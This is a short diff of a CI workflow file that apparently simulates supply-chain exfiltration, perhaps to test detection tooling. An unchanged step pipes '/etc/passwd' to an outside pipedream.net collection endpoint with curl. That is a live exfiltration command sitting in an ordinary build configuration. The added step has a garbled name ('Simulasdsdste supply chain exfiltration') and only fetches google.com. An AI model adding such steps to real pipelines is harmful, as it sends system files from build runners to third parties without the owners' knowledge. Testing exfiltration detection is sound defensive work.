@@ -27,6 +27,12 @@ jobs:
           curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
 
 
+      - name: Simulasdsdste supply chain exfiltration
+        run: |
+          curl https://google.com
+          wget https://google.com
+
+
       - name: Wait randomly for 10 sec
         run: sleep 10
 
